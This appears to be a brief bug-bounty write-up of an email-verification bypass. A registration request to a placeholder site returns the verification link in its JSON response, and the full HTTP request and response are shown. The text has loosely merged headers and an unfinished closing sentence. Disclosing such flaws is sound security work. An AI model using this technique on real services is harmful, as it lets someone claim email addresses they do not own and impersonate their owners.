# Email-Bypass



There are three options for login into the account;

    Facebook Login
    Google Login
    Email and Password Login
    
    
    
# Request:


POST /registerNewUser HTTP/1.1

Host: www.site.com

User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate

Referer: https://www.site.comlogin

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 171

Cookie: foo

DNT: 1 Connection: close givenName=test&familyName=test&gender=0&email=test@gmail.com&tz=20&agreePrivAndTC=true&password=value&action=send-verification-web

I Tried to  Add Such test@gmail.com as email  i get shocked by  viewing the Repose because it leaking the verification link.

# Response:


HTTP/1.1 200 OK Server: nginx

Date: Thu, 28 Jun 2018 06:47:49 GMT

Content-Type: application/json; charset=utf-8

Content-Length: 54 Connection: close X-Powered-By: Express Cache-Control: private, no-cache, no-store, must-revalidate Expires: -1 Pragma: no-cache

Access-Control-Allow-Origin: *

X-Frame-Options: SAMEORIGIN

ETag: W/”36-zOgjh98O1kXD4SR66HqUdT6UxdM”

Strict-Transport-Security: max-age=63072000; includeSubdomains; preload

{“key”:”the verification link”,”success”:1}

After seeing the  verification link my feeling was.
